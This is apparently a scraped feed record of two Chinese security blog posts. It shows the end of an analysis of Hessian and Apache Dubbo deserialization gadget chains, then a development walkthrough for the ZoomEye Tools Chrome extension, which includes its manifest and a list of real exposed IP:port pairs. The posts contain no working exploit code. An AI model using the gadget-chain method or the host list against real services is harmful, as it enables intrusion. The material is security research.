id=\"_6\">小结</h5>\n\n\n\n<p>通过以上两条链可以看出，在Hessian反序列化中基本都是利用了反序列化处理Map类型时，会触发调用<code>Map.put</code>-&#62;<code>Map.putVal</code>-&#62;<code>key.hashCode</code>/<code>key.equals</code>-&#62;...，后面的一系列出发过程，也都与多态特性有关，有的类属性是Object类型，可以设置为任意类，而在hashCode、equals方法又恰好调用了属性的某些方法进行后续的一系列触发。所以要挖掘这样的利用链，可以直接找有hashCode、equals以及readResolve方法的类，然后人进行判断与构造，不过这个工作量应该很大；或者使用一些利用链挖掘工具，根据需要编写规则进行扫描。</p>\n\n\n\n<h4 id=\"apache-dubbo\">Apache Dubbo反序列化简单分析</h4>\n\n\n\n<h5 id=\"apache-dubbo-http\">Apache Dubbo Http反序列化</h5>\n\n\n\n<p>先简单看下之前说到的HTTP问题吧，直接用官方提供的<a href=\"https://github.com/apache/dubbo-samples/tree/master/java\">samples</a>，其中有一个dubbo-samples-http可以直接拿来用，直接在<code>DemoServiceImpl.sayHello</code>方法中打上断点，在<code>RemoteInvocationSerializingExporter.doReadRemoteInvocation</code>中反序列化了数据，使用的是Java Serialization方式：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/5d933ff8-0723-4eb7-b743-ed9ab2f2e105.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>抓包看下，很明显的<code>ac ed</code>标志：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/71856cfc-36ad-4980-9be9-561e2385623a.png-w331s\" alt=\"\" /></figure>\n\n\n\n<h5 id=\"apache-dubbo-dubbo\">Apache Dubbo Dubbo反序列化</h5>\n\n\n\n<p>同样使用官方提供的dubbo-samples-basic，默认Dubbo hessian2协议，Dubbo对hessian2进行了魔改，不过大体结构还是差不多，在<code>MapDeserializer.readMap</code>是依然与Hessian类似：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/cce62d13-ea57-4e1b-98f4-a7f17079ee75.png-w331s\" alt=\"\" /></figure>\n\n\n\n<h4 id=\"_7\">参考</h4>\n\n\n\n<ol><li><a href=\"https://docs.ioin.in/writeup/blog.csdn.net/_u011721501_article_details_79443598/index.html\">https://docs.ioin.in/writeup/blog.csdn.net/_u011721501_article_details_79443598/index.html</a></li><li><a href=\"https://github.com/mbechler/marshalsec/blob/master/marshalsec.pdf\">https://github.com/mbechler/marshalsec/blob/master/marshalsec.pdf</a></li><li><a href=\"https://www.mi1k7ea.com/2020/01/25/Java-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/\">https://www.mi1k7ea.com/2020/01/25/Java-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/44787200\">https://zhuanlan.zhihu.com/p/44787200</a></li></ol>\n\n\n\n<hr class=\"wp-block-separator\" />\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg\" alt=\"Paper\" /></figure>\n\n\n\n<p>本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<a href=\"https://paper.seebug.org/1131/\">https://paper.seebug.org/1131/</a><br></p>\n","descriptionType":"html","publishedDate":"Fri, 31 Jul 2020 03:36:47 +0000","feedId":2536,"bgimg":"https://images.seebug.org/content/images/2020/02/9c004ebe-e855-4a35-9f22-29cca6ef6b1b.png-w331s","linkMd5":"85885b4354ee52f93eb5242e82c5fd02","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn57@2020_6/2020/08/24/21-14-50-790_5bab6100da848818.webp","destWidth":1059,"destHeight":511,"sourceBytes":7128,"destBytes":34032,"author":"叶霖 杨","articleImgCdnMap":{"https://images.seebug.org/content/images/2020/02/9c004ebe-e855-4a35-9f22-29cca6ef6b1b.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn57@2020_6/2020/08/24/21-14-50-790_5bab6100da848818.webp","https://images.seebug.org/content/images/2020/02/83ea1fea-0757-4ff9-9db5-08c8b581c654.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn13@2020_3/2020/08/24/21-14-56-399_51e7a7acbac4afc8.webp","https://images.seebug.org/content/images/2020/02/3790a15f-3b71-4519-9207-93c7de4b8c47.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn70@2020_6/2020/08/24/21-14-57-035_6da282ae39f33073.webp","https://images.seebug.org/content/images/2020/02/2f4b8860-daf1-493e-823a-ed931f37235d.png-w331s":null,"https://images.seebug.org/content/images/2020/02/6a0de531-9634-485b-82e5-9446689bff9b.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn98@2020_4/2020/08/24/21-14-55-005_32fc129f1bad4034.webp","https://images.seebug.org/content/images/2020/02/9f67b723-b0db-4b60-a45b-89607faef2b9.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn65@2020_1/2020/08/24/21-14-54-584_daf7d174252036f3.webp","https://images.seebug.org/content/images/2020/02/424e007b-532f-4978-95ba-bcda0cc7edf8.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn88@2020_4/2020/08/24/21-15-00-713_bc366ad43567f639.webp","https://images.seebug.org/content/images/2020/02/1777783f-47e2-499f-8801-75192e9e9184.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn81@2020_5/2020/08/24/21-14-57-100_bfa6dc5f999ae854.webp","https://images.seebug.org/content/images/2020/02/cd49add1-41a1-4fb0-87d0-3b54c17ac379.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn10@2020_3/2020/08/24/21-14-58-038_b6d79a09337d2603.webp","https://images.seebug.org/content/images/2020/02/a2dea15e-db9c-453b-be02-9e8e246c1c48.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn17@2020_5/2020/08/24/21-14-56-556_3ba6b975f022eccb.webp","https://images.seebug.org/content/images/2020/02/b072344d-c6ed-4ed5-bcf8-072527393516.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn40@2020_5/2020/08/24/21-14-59-630_1b162f4e1a344323.webp","https://images.seebug.org/content/images/2020/02/96643489-6ac9-4f0f-964c-80d257b6124d.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn40@2020_4/2020/08/24/21-14-53-692_cb2c82370ea07372.webp","https://images.seebug.org/content/images/2020/02/c7483297-c421-4aee-9f79-085f1fbede0c.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn28@2020_3/2020/08/24/21-15-01-877_10d817afe4b199a9.webp","https://images.seebug.org/content/images/2020/02/388b27cf-c3e3-4b3b-995e-011d7a1ed3e9.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn61@2020_3/2020/08/24/21-14-55-802_f1c65281d9feb6f0.webp","https://images.seebug.org/content/images/2020/02/749bc734-fa59-4a68-8349-cbef16fbb0bd.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn85@2020_2/2020/08/24/21-14-55-150_663d34000a54d42c.webp","https://images.seebug.org/content/images/2020/02/ef3560f9-7768-43fc-bd7a-f5d2ba3af1f3.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn70@2020_6/2020/08/24/21-14-56-258_1aac274d0f41a900.webp","https://images.seebug.org/content/images/2020/02/4d693cde-92cd-4832-b2ab-569c108c1438.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn4@2020_3/2020/08/24/21-15-01-285_a54d18e2bd095dbb.webp","https://images.seebug.org/content/images/2020/02/5eff612d-dbeb-476e-97d6-60027fb1301c.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn81@2020_3/2020/08/24/21-14-54-548_22b6f1342c1fcd89.webp","https://images.seebug.org/content/images/2020/02/551664cc-5b83-42a4-bc12-3ae0a2677bdc.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn23@2020_2/2020/08/24/21-15-02-435_930cd895f848f1f0.webp","https://images.seebug.org/content/images/2020/02/d70447cb-8905-4264-b5cf-9339a1c07e47.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn39@2020_1/2020/08/24/21-15-00-241_0d7cfd8531397a33.webp","https://images.seebug.org/content/images/2020/02/b31fd03f-a17f-4955-b112-dd3ca941a5e4.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn39@2020_4/2020/08/24/21-15-01-795_0e95ee7b40abd81b.webp","https://images.seebug.org/content/images/2020/02/d481adcc-bdbf-4712-bb75-b76ddeb0f475.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn18@2020_2/2020/08/24/21-14-52-547_482f9e041f377d17.webp","https://images.seebug.org/content/images/2020/02/d50d45c8-0616-4dea-8058-17524a95a3c0.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn19@2020_3/2020/08/24/21-15-01-488_de58e3adcac81b27.webp","https://images.seebug.org/content/images/2020/02/b7cdb93b-acfd-45ea-8fe2-40ad37da7336.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn80@2020_5/2020/08/24/21-15-01-656_db297b3016bf80d5.webp","https://images.seebug.org/content/images/2020/02/536bb80f-40f6-49fc-93b7-70059a9288a6.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn24@2020_1/2020/08/24/21-14-58-611_72bbea2141e4c149.webp","https://images.seebug.org/content/images/2020/02/67911b32-817c-42b8-840d-19500d314a22.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn42@2020_2/2020/08/24/21-14-54-249_0e840df400da224b.webp","https://images.seebug.org/content/images/2020/02/feb02099-dcc4-4e07-881d-6ae766b652db.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn58@2020_3/2020/08/24/21-14-56-007_b0064e6fcd433b19.webp","https://images.seebug.org/content/images/2020/02/21b5010e-58f5-4d4f-8e02-30c87a43f742.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn18@2020_3/2020/08/24/21-14-55-542_732b24eb0d0e0d1a.webp","https://images.seebug.org/content/images/2020/02/76dd1a62-0030-4de7-8390-b3ac88691965.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn62@2020_5/2020/08/24/21-14-58-317_27a401889cb227ea.webp","https://images.seebug.org/content/images/2020/02/ffb644e1-f24c-48f5-adcc-1777eb9b3909.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn19@2020_2/2020/08/24/21-14-59-629_dc24dd38c575b689.webp","https://images.seebug.org/content/images/2020/02/f30cba3b-4b38-482b-8833-5c06b63d9539.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn70@2020_5/2020/08/24/21-14-55-267_be9313c842489915.webp","https://images.seebug.org/content/images/2020/02/788eed7c-a7c5-40a9-a8ad-8ecaeef41d87.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn29@2020_1/2020/08/24/21-14-57-340_363e5b0a99707441.webp","https://images.seebug.org/content/images/2020/02/a211eac5-cd73-4401-ad71-a8f3161e756d.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn66@2020_4/2020/08/24/21-14-57-878_93d1be2a5276cc4a.webp","https://images.seebug.org/content/images/2020/02/7fda9bf8-e4e0-425e-bd49-097977c3d5d1.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn94@2020_3/2020/08/24/21-14-52-953_01c8750ab2a1d128.webp","https://images.seebug.org/content/images/2020/02/e17e9d81-839e-4078-a6a7-1ee5212b88db.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn38@2020_1/2020/08/24/21-14-58-222_5944825478ab5b73.webp","https://images.seebug.org/content/images/2020/02/2f67ddf5-a3dc-4932-94ed-c2e6da674c78.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn7@2020_5/2020/08/24/21-15-01-583_1931ef0811bf33b8.webp","https://images.seebug.org/content/images/2020/02/98a7d3bd-61ba-4977-b2cc-42506d591d0f.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn95@2020_6/2020/08/24/21-14-59-645_2adc0727df234e67.webp","https://images.seebug.org/content/images/2020/02/d6673c56-8548-4026-be42-c2fecff76c5c.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn66@2020_5/2020/08/24/21-14-55-736_561c887c45970d79.webp","https://images.seebug.org/content/images/2020/02/886e58b7-c7bb-483b-9c3c-5436eecafc5f.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn1@2020_1/2020/08/24/21-14-57-198_6d622fe08034204b.webp","https://images.seebug.org/content/images/2020/02/1a6ed295-a594-4599-8a84-cf6ed6ac03d7.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn35@2020_3/2020/08/24/21-14-53-903_6d5b1ef2746024d9.webp","https://images.seebug.org/content/images/2020/02/915c0c41-748b-4b0b-9e69-5364d9363807.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn43@2020_5/2020/08/24/21-14-58-531_f4171aa2a3dfc80c.webp","https://images.seebug.org/content/images/2020/02/2e9ff77d-da4d-407f-ab7f-da8c6970c119.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn26@2020_5/2020/08/24/21-14-56-233_663876e4a462d9b5.webp","https://images.seebug.org/content/images/2020/02/157bdb00-8427-4db7-92fe-38d62ecfeb17.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn4@2020_5/2020/08/24/21-14-54-244_2693725753505ba9.webp","https://images.seebug.org/content/images/2020/02/ed8c53cf-66fb-4b4e-b337-84d9e7f15818.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn51@2020_2/2020/08/24/21-15-00-523_ba4ff810fa072144.webp","https://images.seebug.org/content/images/2020/02/7c4c5cc2-14d2-4108-9c7c-297af12edea8.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn4@2020_4/2020/08/24/21-15-01-695_ad99a82ddceb452d.webp","https://images.seebug.org/content/images/2020/02/5cae5229-0b1f-422f-99b6-78fe62f4acaf.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn66@2020_3/2020/08/24/21-14-57-306_1ab1ca325acc58b1.webp","https://images.seebug.org/content/images/2020/02/7dedee9c-36ec-4ba3-a096-e637cc1b0e3a.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn20@2020_6/2020/08/24/21-14-52-990_98e3b9b93263fb90.webp","https://images.seebug.org/content/images/2020/02/78c26a65-90da-4d8d-b354-f6d2c44f926f.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn36@2020_5/2020/08/24/21-14-59-716_e701e56136112994.webp","https://images.seebug.org/content/images/2020/02/5d933ff8-0723-4eb7-b743-ed9ab2f2e105.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn25@2020_2/2020/08/24/21-14-57-563_dee726451450f927.webp","https://images.seebug.org/content/images/2020/02/71856cfc-36ad-4980-9be9-561e2385623a.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn82@2020_1/2020/08/24/21-14-52-615_8b28b1202aabcd66.webp","https://images.seebug.org/content/images/2020/02/cce62d13-ea57-4e1b-98f4-a7f17079ee75.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn54@2020_5/2020/08/24/21-14-57-288_b36ce0f0a12d7d90.webp","https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn7@2020_5/2020/08/24/21-15-00-499_446834a71d30acd0.webp"},"publishedOrCreatedDate":1598303688720},{"createdTime":"2020-08-25 05:14:48","updatedTime":"2020-08-25 05:14:48","title":"从 0 开始入门 Chrome Ext 安全（番外篇） — ZoomEye Tools","link":"https://blog.knownsec.com/?p=5037","description":"\n<p><strong>作者：LoRexxar@知道创宇404实验室</strong><br><strong>时间：2020年01月17日</strong><br><strong>英文版本:&#160;<a href=\"https://paper.seebug.org/1116/\">https://paper.seebug.org/1116/</a></strong><br><strong>系列文章：<br>1.《<a href=\"https://paper.seebug.org/1082/\">从 0 开始入门 Chrome Ext 安全（一） -- 了解一个 Chrome Ext》</a><br>2.<a href=\"https://paper.seebug.org/1092/\">《从 0 开始入门 Chrome Ext 安全（二） -- 安全的 Chrome Ext》</a></strong></p>\n\n\n\n<p>在经历了两次对Chrome Ext安全的深入研究之后，这期我们先把Chrome插件安全的问题放下来，这期我们讲一个关于Chrome Ext的番外篇 -- Zoomeye Tools.</p>\n\n\n\n<p>链接为：<a href=\"https://chrome.google.com/webstore/detail/zoomeyetools/bdoaeiibkccgkbjbmmmoemghacnkbklj\">https://chrome.google.com/webstore/detail/zoomeyetools/bdoaeiibkccgkbjbmmmoemghacnkbklj</a></p>\n\n\n\n<p>这篇文章让我们换一个角度，从开发一个插件开始，如何去审视chrome不同层级之间的问题。</p>\n\n\n\n<p>这里我们主要的目的是完成一个ZoomEye的辅助插件。</p>\n\n\n\n<h1 id=\"_1\">核心与功能设计</h1>\n\n\n\n<p>在ZoomEye Tools中，我们主要加入了一下针对ZoomEye的辅助性功能，在设计ZoomEye Tools之前，首先我们需要思考我们需要什么样的功能。</p>\n\n\n\n<p>这里我们需要需要实现的是两个大功能，</p>\n\n\n\n<p>1、首先需要完成一个简易版本的ZoomEye界面，用于显示当前域对应ip的搜索结果。<br>2、我们会完成一些ZoomEye的辅助小功能，比如说一键复制搜索结果的左右ip等...</p>\n\n\n\n<p>这里我们分别研究这两个功能所需要的部分：</p>\n\n\n\n<h2 id=\"zoomeye-minitools\">ZoomEye minitools</h2>\n\n\n\n<p>关于ZoomEye的一些辅助小功能，这里我们首先拿一个需求来举例子，我们需要一个能够复制ZoomEye页面内所有ip的功能，能便于方便的写脚本或者复制出来使用。</p>\n\n\n\n<p>在开始之前，我们首先得明确chrome插件中不同层级之间的权限体系和通信方式：</p>\n\n\n\n<p>在第一篇文章中我曾着重讲过这部分内容。</p>\n\n\n\n<ul><li><a href=\"https://lorexxar.cn/2019/11/22/chrome-ext-1/#%E6%9D%83%E9%99%90%E4%BD%93%E7%B3%BB%E5%92%8Capi\">从0开始入门Chrome Ext安全（一） -- 了解一个Chrome Ext</a></li></ul>\n\n\n\n<p>我们需要完成的这个功能，可以简单量化为下面的流程：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">用户点击浏览器插件的功能\n--&#38;gt;\n浏览器插件读取当前Zoomeye页面的内容\n--&#38;gt;\n解析其中内容并提取其中的内容并按照格式写入剪切板中</pre>\n\n\n\n<p>当然这是人类的思维，结合chrome插件的权限体系和通信方式，我们需要把每一部分拆解为相应的解决方案。</p>\n\n\n\n<ul><li>用户点击浏览器插件的功能</li></ul>\n\n\n\n<p>当用户点击浏览器插件的图标时，将会展示popup.html中的功能，并执行页面中相应加的js代码。</p>\n\n\n\n<ul><li>浏览器插件读取当前ZoomEye页面的内容</li></ul>\n\n\n\n<p>由于popup script没有权限读取页面内容，所以这里我们必须通过<code>chrome.tabs.sendMessage</code>来沟通content script，通过content script来读取页面内容。</p>\n\n\n\n<ul><li>解析其中内容并提取其中的内容并按照格式写入剪切板中</li></ul>\n\n\n\n<p>在content script读取到页面内容之后，需要通过<code>sendResponse</code>反馈数据。</p>\n\n\n\n<p>当popup收到数据之后，我们需要通过特殊的技巧把数据写入剪切板</p>\n\n\n\n<pre class=\"crayon-plain-tag\">function copytext(text){\n    var w = document.createElement('textarea');\n    w.value = text;\n    document.body.appendChild(w);\n    w.select();\n\n\n    document.execCommand('Copy');\n\n    w.style.display = 'none';\n    return;\n}</pre>\n\n\n\n<p>这里我们是通过新建了textarea标签并选中其内容，然后触发copy指令来完成。</p>\n\n\n\n<p>整体流程大致如下</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/a6d6c012-36c8-47e1-9de0-cef8eaec4b27.png-w331s\" alt=\"\" /></figure>\n\n\n\n<h2 id=\"zoomeye-preview\">ZoomEye preview</h2>\n\n\n\n<p>与minitools的功能不同，要完成ZoomEye preview首先我们遇到的第一个问题是ZoomEye本身的鉴权体系。</p>\n\n\n\n<p>在ZoomEye的设计中，大部分的搜索结果都需要登录之后使用，而且其相应的多种请求api都是通过jwt来做验证。</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/9b5e40a0-1388-4093-b47c-70499ab8624e.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>而这个jwt token会在登陆期间内储存在浏览器的local storage中。</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/85c46e35-d4a0-42fc-b333-67aa451505a4.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>我们可以简单的把架构画成这个样子</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/cbf9a0f6-df4e-466c-89a1-eb55c489f1af.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>在继续设计代码逻辑之前，我们首先必须确定逻辑流程，我们仍然把流程量化为下面的步骤：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">用户点击ZoomEye tools插件\n--&#38;gt;\n插件检查数据之后确认未登录，返回需要登录\n--&#38;gt;\n用户点击按钮跳转登录界面登录\n--&#38;gt;\n插件获取凭证之后储存\n--&#38;gt;\n用户打开网站之后点击插件\n--&#38;gt;\n插件通过凭据以及请求的host来获取ZoomEye数据\n--&#38;gt;\n将部分数据反馈到页面中</pre>\n\n\n\n<p>紧接着我们配合chrome插件体系的逻辑，把前面步骤转化为程序逻辑流程。</p>\n\n\n\n<ul><li>用户点击ZoomEye tools插件</li></ul>\n\n\n\n<p>插件将会加载popup.html页面并执行相应的js代码。</p>\n\n\n\n<ul><li>插件检查数据之后确认未登录，返回需要登录</li></ul>\n\n\n\n<p>插件将获取储存在<code>chrome.storage</code>的Zoomeye token，然后请求<code>ZoomEye.org/user</code>判断登录凭据是否有效。如果无效，则会在popup.html显示need login。并隐藏其他的div窗口。</p>\n\n\n\n<ul><li>用户点击按钮跳转登录界面登录</li></ul>\n\n\n\n<p>当用户点击按钮之后，浏览器会直接打开&#160;<code>https://sso.telnet404.com/cas/login?service=https%3A%2F%2Fwww.zoomeye.org%2Flogin</code></p>\n\n\n\n<p>如果浏览器当前在登录状态时，则会跳转回ZoomEye并将相应的数据写到localStorage里。</p>\n\n\n\n<ul><li>插件获取凭证之后储存</li></ul>\n\n\n\n<p>由于前后端的操作分离，所有bg script需要一个明显的标志来提示需要获取浏览器前端的登录凭证，我把这个标识为定为了<strong>当tab变化时，域属于ZoomEye.org且未登录时</strong>，这时候bg script会使用<code>chrome.tabs.executeScript</code>来使前端完成获取localStorage并储存进chrome.storage.</p>\n\n\n\n<p>这样一来，插件就拿到了最关键的jwt token</p>\n\n\n\n<ul><li>用户打开网站之后点击插件</li></ul>\n\n\n\n<p>在完成了登录问题之后，用户就可以正常使用preview功能了。</p>\n\n\n\n<p>当用户打开网站之后，为了减少数据加载的等待时间，bg script会直接开始获取数据。</p>\n\n\n\n<ul><li>插件通过凭据以及请求的host来获取ZoomEye数据</li></ul>\n\n\n\n<p>后端bg script 通过判断tab状态变化，来启发获取数据的事件，插件会通过前面获得的账号凭据来请求</p>\n\n\n\n<p><code>https://www.zoomeye.org/searchDetail?type=host&#38;title=</code>&#160;并解析json，来获取相应的ip数据。</p>\n\n\n\n<ul><li>将部分数据反馈到页面中</li></ul>\n\n\n\n<p>当用户点击插件时，popup script会检查当前tab的url和后端全局变量中的数据是否一致，然后通过</p>\n\n\n\n<pre class=\"crayon-plain-tag\">bg = chrome.extension.getBackgroundPage();</pre>\n\n\n\n<p>来获取到bg的全局变量。然后将数据写入页面中。</p>\n\n\n\n<p>整个流程的架构如下：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/32467390-67b4-401c-84b7-bce8b36c04b5.png-w331s\" alt=\"\" /></figure>\n\n\n\n<h1 id=\"_2\">完成插件</h1>\n\n\n\n<p>在完成架构设计之后，我们只要遵守好插件不同层级之间的各种权限体系，就可以完成基础的设计，配合我们的功能，我们生成的manifest.json如下</p>\n\n\n\n<pre class=\"crayon-plain-tag\">{\n    &#34;name&#34;: &#34;Zoomeye Tools&#34;,\n    &#34;version&#34;: &#34;0.1.0&#34;,\n    &#34;manifest_version&#34;: 2,\n    &#34;description&#34;: &#34;Zoomeye Tools provides a variety of functions to assist the use of Zoomeye, including a proview host and many other functions&#34;,\n    &#34;icons&#34;: {\n        &#34;16&#34;: &#34;img/16_16.png&#34;,\n        &#34;48&#34;: &#34;img/48_48.png&#34;,\n        &#34;128&#34;: &#34;img/128_128.png&#34;\n    },\n    &#34;background&#34;: {\n        &#34;scripts&#34;: [&#34;/js/jquery-3.4.1.js&#34;, &#34;js/background.js&#34;]\n    },\n    &#34;content_scripts&#34;: [\n        {\n            &#34;matches&#34;: [&#34;*://*.zoomeye.org/*&#34;],\n            &#34;js&#34;: [&#34;js/contentScript.js&#34;],\n            &#34;run_at&#34;: &#34;document_end&#34;\n        }\n     ],\n    &#34;content_security_policy&#34;: &#34;script-src 'self' 'unsafe-eval'; object-src 'self';&#34;,\n    &#34;browser_action&#34;: {\n        &#34;default_icon&#34;: {\n            &#34;19&#34;: &#34;img/19_19.png&#34;,\n            &#34;38&#34;: &#34;img/38_38.png&#34;\n        },\n        &#34;default_title&#34;: &#34;Zoomeye Tools&#34;,\n        &#34;default_popup&#34;: &#34;html/popup.html&#34;\n    },\n    &#34;permissions&#34;: [\n        &#34;clipboardWrite&#34;,\n        &#34;tabs&#34;,\n        &#34;storage&#34;,\n        &#34;activeTab&#34;,\n        &#34;https://api.zoomeye.org/&#34;,\n        &#34;https://*.zoomeye.org/&#34;\n    ]\n}</pre>\n\n\n\n<h1 id=\"chrome-store\">上传插件到chrome store</h1>\n\n\n\n<p>在chrome的某一个版本之后，chrome就不再允许自签名的插件安装了，如果想要在chrome上安装，那就必须花费5美金注册为chrome插件开发者。</p>\n\n\n\n<p>并且对于chrome来说，他有一套自己的安全体系，如果你得插件作用于多个域名下，那么他会在审核插件之前加入额外的审核，如果想要快速提交自己的插件，那么你就必须遵守chrome的规则。</p>\n\n\n\n<p>你可以在chrome的开发者信息中心完成这些。</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/8d773148-62b9-4594-8213-5566fbdfb499.png-w331s\" alt=\"\" /></figure>\n\n\n\n<h1 id=\"zoomeye-tools\">Zoomeye Tools 使用全解</h1>\n\n\n\n<h2 id=\"_3\">安装</h2>\n\n\n\n<p>chromium系的所有浏览器都可以直接下载</p>\n\n\n\n<ul><li><a href=\"https://chrome.google.com/webstore/detail/zoomeye-tools/bdoaeiibkccgkbjbmmmoemghacnkbklj\">https://chrome.google.com/webstore/detail/zoomeye-tools/bdoaeiibkccgkbjbmmmoemghacnkbklj</a></li></ul>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/bad4d79b-169f-4e8f-b2c8-995a9ad78277.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>初次安装完成时应该为</p>\n\n\n\n<h2 id=\"_4\">使用方法</h2>\n\n\n\n<p>由于Zoomeye Tools提供了两个功能，一个是Zoomeye辅助工具，一个是Zoomeye preview.</p>\n\n\n\n<h3 id=\"zoomeye\">zoomeye 辅助工具</h3>\n\n\n\n<p>首先第一个功能是配合Zoomeye的，只会在Zoomeye域下生效，这个功能不需要登录zoomeye。</p>\n\n\n\n<p>当我们打开Zoomeye之后搜索任意banner，等待页面加载完成后，再点击右上角的插件图标，就能看到多出来的两条选项。</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/3cabfcff-59f9-462e-9535-c2e8ea2a34e9.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>如果我们选择copy all ip with LF，那么剪切板就是</p>\n\n\n\n<pre class=\"crayon-plain-tag\">23.225.23.22:8883\n23.225.23.19:8883\n23.225.23.20:8883\n149.11.28.76:10443\n149.56.86.123:10443\n149.56.86.125:10443\n149.233.171.202:10443\n149.11.28.75:10443\n149.202.168.81:10443\n149.56.86.116:10443\n149.129.113.51:10443\n149.129.104.246:10443\n149.11.28.74:10443\n149.210.159.238:10443\n149.56.86.113:10443\n149.56.86.114:10443\n149.56.86.122:10443\n149.100.174.228:10443\n149.62.147.11:10443\n149.11.130.74:10443</pre>\n\n\n\n<p>如果我们选择copy all url with port</p>\n\n\n\n<pre class=\"crayon-plain-tag\">'23.225.23.22:8883','23.225.23.19:8883','23.225.23.20:8883','149.11.28.76:10443','149.56.86.123:10443','149.56.86.125:10443','149.233.171.202:10443','149.11.28.75:10443','149.202.168.81:10443','149.56.86.116:10443','149.129.113.51:10443','149.129.104.246:10443','149.11.28.74:10443','149.210.159.238:10443','149.56.86.113:10443','149.56.86.114:10443','149.56.86.122:10443','149.100.174.228:10443','149.62.147.11:10443','149.11.130.74:10443'</pre>\n\n\n\n<h3 id=\"zoomeye-preview_1\">Zoomeye Preview</h3>\n\n\n\n<p>第二个功能是一个简易版本的Zoomeye，这个功能需要登录Zoomeye。</p>\n\n\n\n<p>在任意域我们点击右上角的Login 